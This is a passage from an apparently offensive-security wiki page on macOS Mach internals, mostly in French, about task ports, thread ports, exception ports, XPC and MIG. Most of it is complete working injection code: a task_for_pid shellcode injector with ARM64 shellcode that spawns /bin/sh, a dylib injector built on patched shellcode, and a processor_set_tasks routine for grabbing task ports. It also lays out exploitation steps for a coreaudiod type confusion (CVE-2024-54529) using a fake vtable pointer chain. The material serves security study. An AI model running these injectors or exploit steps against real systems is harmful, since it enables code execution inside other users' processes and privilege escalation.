- Les applications disposant de l'entitlement **`com.apple.system-task-ports`** peuvent obtenir le **task port de n'importe quel** processus, à l'exception du kernel. Dans les anciennes versions, il s'appelait **`task_for_pid-allow`**. Cet entitlement n'est accordé qu'aux applications Apple.
- **Root peut accéder aux task ports** des applications **non compilées avec un runtime** hardened (et qui ne proviennent pas d'Apple).

**The task name port:** Une version non privilégiée du _task port_. Il fait référence à la task, mais ne permet pas de la contrôler. La seule chose qui semble être disponible via celui-ci est `task_info()`.

### Thread Ports

Les threads disposent également de ports associés, qui sont visibles depuis la task appelant **`task_threads`** et depuis le processor avec `processor_set_threads`. Un droit SEND sur le thread port permet d'utiliser les fonctions du sous-système `thread_act`, telles que:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

N'importe quel thread peut obtenir ce port en appelant **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Vous pouvez récupérer du shellcode depuis:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compilez** le programme précédent et ajoutez les **entitlements** nécessaires pour pouvoir injecter du code avec le même utilisateur (sinon, vous devrez utiliser **sudo**).<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Pour que cela fonctionne sur iOS, vous avez besoin de l'entitlement `dynamic-codesigning` afin de pouvoir rendre une mémoire inscriptible exécutable.

### Dylib Injection in thread via Task port

Dans macOS, les **threads** peuvent être manipulés via **Mach** ou en utilisant la **posix `pthread` api**. Le thread que nous avons généré lors de l'injection précédente a été créé avec la Mach api, il **n'est donc pas compatible posix**.

Il était possible d'**injecter un simple shellcode** pour exécuter une commande, car celui-ci **n'avait pas besoin de fonctionner avec des apis compatibles posix**, uniquement avec Mach. Des **injections plus complexes** nécessiteraient que le **thread** soit également **compatible posix**.

Par conséquent, pour **améliorer le thread**, celui-ci devrait appeler **`pthread_create_from_mach_thread`**, ce qui **créera un pthread valide**. Ce nouveau pthread pourrait ensuite **appeler dlopen** pour **charger une dylib** depuis le système. Ainsi, au lieu d'écrire un nouveau shellcode pour effectuer différentes actions, il est possible de charger des bibliothèques personnalisées.<sup>[[2]](#references)</sup>

Vous pouvez trouver des **dylibs d'exemple** dans (par exemple, celle qui génère un log que vous pouvez ensuite écouter) :


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Dans cette technique, un thread du processus est hijacked :


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

L'appel à `task_for_pid` ou `thread_create_*` incrémente un compteur dans la structure task du kernel, qui peut être consulté depuis le user mode en appelant `task_info(task, TASK_EXTMOD_INFO, ...)`.

## Exception Ports

Lorsqu'une exception se produit dans un thread, cette exception est envoyée à l'exception port désigné du thread. Si le thread ne la gère pas, elle est alors envoyée aux exception ports de la task. Si la task ne la gère pas, elle est envoyée au host port géré par launchd (où elle sera acquittée). Ce processus est appelé exception triage.

Notez qu'en général, si le rapport n'est pas correctement géré, il finira par être pris en charge par le daemon ReportCrash. Cependant, il est possible qu'un autre thread de la même task gère l'exception ; c'est ce que font les outils de crash reporting comme `PLCreashReporter`.

## Other Objects

### Clock

Tout utilisateur peut accéder aux informations de l'horloge. Cependant, pour définir l'heure ou modifier d'autres paramètres, il faut être root.

Pour obtenir des informations, il est possible d'appeler des fonctions du subsystem `clock`, telles que `clock_get_time`, `clock_get_attributtes` ou `clock_alarm`\
Pour modifier les valeurs, le subsystem `clock_priv` peut être utilisé avec des fonctions telles que `clock_set_time` et `clock_set_attributes`.

### Processors and Processor Set

Les APIs des processors permettent de contrôler un logical processor individuel en appelant des fonctions telles que `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

De plus, les APIs du **processor set** permettent de regrouper plusieurs processors au sein d'un groupe. Il est possible de récupérer le processor set par défaut en appelant **`processor_set_default`**.\
Voici quelques APIs intéressantes pour interagir avec le processor set :

- `processor_set_statistics`
- `processor_set_tasks` : Retourne un tableau de send rights vers toutes les tasks du processor set
- `processor_set_threads` : Retourne un tableau de send rights vers tous les threads du processor set
- `processor_set_stack_usage`
- `processor_set_info`

Comme mentionné dans [**ce post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), cela permettait autrefois de contourner la protection mentionnée précédemment afin d'obtenir les task ports d'autres processus et de les contrôler en appelant **`processor_set_tasks`**, ce qui permettait d'obtenir un host port pour chaque processus.<sup>[[10]](#references)</sup>\
De nos jours, il faut être root pour utiliser cette fonction, qui est protégée ; vous ne pourrez donc obtenir ces ports que sur des processus non protégés.<sup>[[10]](#references)</sup>

Vous pouvez essayer avec :

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[9]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; appel indirect via l'emplacement de la vtable
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [7] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [8] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [9] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [10] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)
- [11] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)

{{#include ../../../../banners/hacktricks-training.md}}
